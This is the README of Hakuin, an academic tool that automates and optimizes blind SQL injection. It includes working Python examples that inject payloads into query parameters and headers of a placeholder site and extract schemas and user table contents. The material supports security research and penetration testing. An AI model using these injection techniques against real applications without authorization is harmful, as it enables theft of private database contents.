<p align="center">
    <img width="150" src="https://raw.githubusercontent.com/pruzko/hakuin/main/logo.png">
</p>

Hakuin is a Blind SQL Injection (BSQLI) optimization and automation framework and tool written in Python 3. It abstracts away the inference logic and allows users to easily and efficiently extract databases (DB) from vulnerable web applications. To speed up the process, Hakuin utilizes a variety of optimization methods, including pre-trained and adaptive language models, opportunistic guessing, parallelism, and more.

Hakuin has been presented at esteemed academic and industrial conferences:
- [BlackHat MEA, Riyadh](https://blackhatmea.com/session/hakuin-injecting-brain-blind-sql-injection), 2023
- [Hack in the Box, Phuket](https://conference.hitb.org/hitbsecconf2023hkt/session/hakuin-injecting-brains-into-blind-sql-injection/), 2023
- [IEEE S&P Workshop on Offsensive Technology (WOOT)](https://wootconference.org/papers/woot23-paper17.pdf), 2023

More information can be found in our [paper](https://github.com/pruzko/hakuin/blob/main/publications/Hakuin_WOOT_23.pdf) and [slides](https://github.com/pruzko/hakuin/blob/main/publications/Hakuin_HITB_23.pdf).


## Installation
To install Hakuin, simply run:
```
pip3 install hakuin
hk -h
```

Note that installation is optional and you can use Hakuin directly from the source codes:
```
git clone https://github.com/pruzko/hakuin
cd hakuin
python3 hk.py -h
```

## Command Line Tool
Hakuin ships with an intuitive tool called `hk` that offers most of Hakuin's features directly from the command line. To find out more, run:
```
hk -h
```

## Custom Scripting
Sometimes, BSQLI vunerabilities are too tricky to be exploited from the command line and require custom scripting. This is where Hakuin's Python package shines, giving you total control over the extraction process.

To customize exploitation, you need to instruct Hakuin on how to inject its queries. This is done by deriving a class from the `Requester` and overriding the `request` method. Aside from injecting queries, the method must determine whether they resolved to `True` or `False`.


##### Example 1 - Query Parameter Injection with Status-based Inference
```python
import aiohttp
from hakuin import Requester

class StatusRequester(Requester):
    async def request(self, ctx, query):
        r = await aiohttp.get(f'http://vuln.com/?n=XXX" OR ({query}) --')
        return r.status == 200
```

##### Example 2 - Header Injection with Content-based Inference
```python
class ContentRequester(Requester):
    async def request(self, ctx, query):
        headers = {'vulnerable-header': f'xxx" OR ({query}) --'}
        r = await aiohttp.get(f'http://vuln.com/', headers=headers)
        return 'found' in await r.text()
```

To start extracting data, use the `Extractor` class. It requires a `DBMS` object to contruct queries and a `Requester` object to inject them. Hakuin currently supports `MSSQL`, `MySQL`, `OracleDB`, `Postgres`, and `SQLite` DBMSs. If you wish to support another DBMS, implement the `DBMS` interface defined in `hakuin/dbms/DBMS.py`.

##### Example 1 - Extracting MSSQL/MySQL/OracleDB/Postgres/SQLite
```python
import asyncio
from hakuin import Extractor, Requester
from hakuin.dbms import MSSQL, MySQL, OracleDB, Postgres, SQLite

class StatusRequester(Requester):
    ...

async def main():
    ext = Extractor(requester=StatusRequester(), dbms=SQLite())
    ...

if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(main())
```

Now that eveything is set, you can start extracting DB metadata.

##### Example 1 - Extracting DB Schemas/Tables/Columns
```python
# strategy:
#   'binary':   Use binary search
#   'model':    Use pre-trained model
schema_names = await ext.extract_schema_names(strategy='model')             # extracts schema names
tables = await ext.extract_table_names(strategy='model')                    # extracts table names
columns = await ext.extract_column_names(table='users', strategy='model')   # extracts column names
metadata = await ext.extract_meta(strategy='model')                         # extracts all table and column names
```

Once you know the DB structure, you can extract the actual content.

##### Example 1 - Extracting Column Data
```python
# text_strategy:    Use this strategy if the column is text
res = await ext.extract_column(table='users', column='address', text_strategy='dynamic')    # detects types and extracts columns

# strategy:
#   'binary':       Use binary search
#   'fivegram':     Use five-gram model
#   'unigram':      Use unigram model
#   'dynamic':      Dynamically identify the best strategy. This setting
#                   also enables opportunistic guessing.
res = await ext.extract_column_text(table='users', column='address', strategy='dynamic')    # extracts text columns
res = await ext.extract_column_int(table='users', column='id')                              # extracts int columns
res = await ext.extract_column_float(table='products', column='price')                      # extracts float columns
res = await ext.extract_column_blob(table='users', column='id')                             # extracts blob columns
```

More examples can be found in the `tests` directory.



## For Researchers
This repository is actively developed to fit the needs of security practitioners. Researchers looking to reproduce the experiments described in our paper should install the [frozen version](https://zenodo.org/record/7804243) as it contains the original code, experiment scripts, and an instruction manual for reproducing the results.


#### Cite Hakuin
```
@inproceedings{hakuin_bsqli,
  title={Hakuin: Optimizing Blind SQL Injection with Probabilistic Language Models},
  author={Pru{\v{z}}inec, Jakub and Nguyen, Quynh Anh},
  booktitle={2023 IEEE Security and Privacy Workshops (SPW)},
  pages={384--393},
  year={2023},
  organization={IEEE}
}
```
